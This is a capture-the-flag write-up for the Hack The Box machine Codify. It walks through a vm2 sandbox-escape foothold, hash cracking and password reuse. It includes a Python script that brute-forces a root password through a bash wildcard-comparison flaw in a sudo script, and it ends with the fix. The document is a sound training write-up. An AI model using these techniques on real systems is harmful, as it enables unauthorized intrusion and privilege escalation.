#HTB-Codify

This machine can be viewed at: https://app.hackthebox.com/machines/Codify

##Phase 1: Initial Foothold

We begin the machine by enumerating the ports and services open using the following nmap scans

```markdown
sudo nmap -sS -p- -Pn -n --min-rate 5000 $IP
[sudo] password for rat: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-24 22:38 UTC
Nmap scan report for 10.10.11.239
Host is up (0.070s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 13.86 seconds
```

We notice SSH, an HTTP server on port 80 and a service which I don't know on port 3000. We proceed with the service enumeration scan:

```markdown
sudo nmap -sCV -p 22,80,3000 $IP
[sudo] password for rat: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-24 22:44 UTC
Nmap scan report for codify.htb (10.10.11.239)
Host is up (0.070s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Codify
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.68 seconds
```

We learn that the unknown service is a Node.js frame. We enter the web server to begin enumeration.

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/7f790118-aed2-4c60-bf03-ded91655ff39)

We begin some GoBuster scans in the background in case there are some hidden web directories, however, we can find three pages from the get go: /index, /about and /editor. We are mainly interested in /about and /editor.
![image](https://github.com/Rapfael01/Write-ups/assets/70867743/90a4e893-1fe7-4fa8-a8d5-9793c9d0578e)

- **/editor**: A simple page that allows the users compile and execute Node.js code on the web.

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/fb5f7ad8-74d0-4b4b-8db8-0efb0879fb40)

- **/about**: A simple about page, where we learn the page uses vm2 and is linked to the release version (3.9.16).

After we research about this vm2 version, we learn that there is an arbitrary code execution vulnerability ([CVE-2023-37466](https://nvd.nist.gov/vuln/detail/CVE-2023-37466)). We find a [POC](https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244) as one of the first results in google, and by testing it, we get arbitrary commands on the host!
![image](https://github.com/Rapfael01/Write-ups/assets/70867743/03375821-34f3-433e-82ea-5bafcc287bea)

We set up a nc listener, execute a reverse shell command and stabilize the shell, and we have the initial foothold!
![image](https://github.com/Rapfael01/Write-ups/assets/70867743/4865dce3-41aa-4afd-8607-293260e57288)

##Phase 2: PrivEsc to user

As we stand right now, we're in a low privilege account from which we cannot do too much. We can check for accounts that have access to bash by quickly enumerating them from the /etc/passwd file.

```markdown
svc@codify:~$ cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
svc@codify:~$ 
```
We begin our privilege escalation process by uploading linpeas to the machine and enumerating the vulnerabilities available to exploit. After testing a couple of things, we find an interesting file stored within /var/www called tickets.db.

```markdown
╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 836, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 3, database pages 6, cookie 0x5, schema 4, UTF-8, version-valid-for 3
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/lib/plocate/plocate.db: regular file, no read permission
Found /var/www/contact/tickets.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 17, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 17
```
We head towards the directory and strings the .db file, where we obtain a bcrypt hash for the MySQL password for joshua. We know it's MySQL because we also found the 3306 port listening during our linpeas analysis.

```markdown
svc@codify:/var/www/contact$ strings tickets.db 
SQLite format 3
otableticketstickets
CREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P
Ytablesqlite_sequencesqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)
	tableusersusers
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
    ))
indexsqlite_autoindex_users_1users
##################################################################
joshua
users
tickets
Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open
Tom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
svc@codify:/var/www/contact$ 
```

We crack the obtained hash in our machine using john, and boom! We get the MySQL password for joshua.

```markdown
john joshua.hash --wordlist=/usr/share/Wordlists/rockyou.txt --format=bcrypt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
No password hashes left to crack (see FAQ)
```

We should try to use this password to login as Joshua in our target since users tend to use the same passwords for most pages.

```markdown
svc@codify:/var/www/contact$ su joshua
Password: 
joshua@codify:/var/www/contact$ 
```
And just like that, we are now a user and get our user flag! We can also connect via SSH for a more stable shell.

##Phase 3: PrivEsc to root

My first instict was to use the existing MySQL table users (which we learned was there in the tickets.db file) to try to find the hash for the root user and decrypt it. Although the password hash was there, we could not find a hit using rockyou.txt, so we move on to find another escalation vector.

We check for sudo commands our user can execute by using sudo -l, and we get a bash script that backs up the MySQL database.

```markdown
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
joshua@codify:~$ 
```
We list its permissions using ls -l. We can execute and read the code. The source code for this script goes as follows:
```markdown
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
joshua@codify:~$
```
At first, I was a little lost since there were no clear indicators for escalation methods I had experience with. But, since the code had no clear vulnerabilities to me, I assumed that maybe the path to root lied within the way the script was authenticating the password. I copied the code up to the authentication section, created a local file it would use to extract the password from (just like the actual script) and started trying different things. After a lot (and I mean a lot) of trial and error, I learned that introducing a wildcard as the password worked as a valid authentication. And once again, I hit a dead end and took a break. While I was looking for a file on my Windows machine using the command _dir /s /b *.txt_, I had an epiphany where I realized I could probably guess each character of the password by using [char]* as an input for the password. After testing on my local copy of the code, it worked! So I ended up creating the following python script to automate this process:

```markdown
import subprocess

final_pass = ""

def crack_pass(password):

	command = "sudo /opt/scripts/mysql-backup.sh"
	character_list="0123456789abcdefghijkmnlopqrstuvwxyzABCDEFGHIJKMNLOPQRSTUVWXYZ!\"#$%&'()+,-./:;<=>?@[]^_`{|}~"

	out = ""
	for char in character_list:
		process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
		process.stdin.write(f"{password}{char}*\n")
		process.stdin.flush()  
		output, error = process.communicate()
		#print(output)
		if "failed!" not in output:
			print(f"Character found: {char}!")
			out=crack_pass(password+char)
			break
		elif char==character_list[-1]:
			print(password)
			break


crack_pass(final_pass)
```
We pop the script in, and it works like charm!

```markdown
joshua@codify:/tmp/.pwned$ su root
Password: 
root@codify:/tmp/.pwned# 
```

And just like that, this machine has been pwned!

##Lessons

After researching a little bit, I learned that the bash vulnerability was caused because of the use of [pattern matching](https://www.baeldung.com/linux/bash-single-vs-double-brackets#4-pattern-matching) instead of exact string matching. This issue can be easily resolved by changing [[]] for [] in the password confirmation section for the script.
